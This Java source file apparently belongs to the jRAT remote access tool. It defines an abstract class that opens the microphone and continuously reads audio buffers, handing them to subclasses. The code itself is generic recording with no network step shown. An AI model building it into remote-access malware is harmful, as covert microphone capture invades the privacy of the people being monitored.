package jrat.common;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.TargetDataLine;

public abstract class SoundWriter implements Runnable {

	public static SoundWriter instance;

	protected int quality;
	
	private DataLine.Info info;
	private TargetDataLine line;
	private AudioFormat format;
	private boolean running;

	public SoundWriter(int quality) {
		SoundWriter.instance = this;
		this.quality = quality;
		this.format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, quality, 16, 2, 4, quality, false);
	}

	public void enable() throws Exception {
		if (running) {
			disable();
		}
		
		running = true;
		info = new DataLine.Info(TargetDataLine.class, format);
		line = (TargetDataLine) AudioSystem.getLine(info);
		line.open();
		line.start();
	}

	public void disable() throws Exception {
		running = false;
		if (line != null) {
			line.close();
		}
	}

	@Override
	public void run() {
		try {
			enable();
			while (running) {
				byte[] data = new byte[line.getBufferSize() / 5];

				int read = line.read(data, 0, data.length);

				onRead(data, read);
			}
			disable();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public abstract void onRead(byte[] data, int read) throws Exception;

	public void stop() {
		running = false;
	}

}
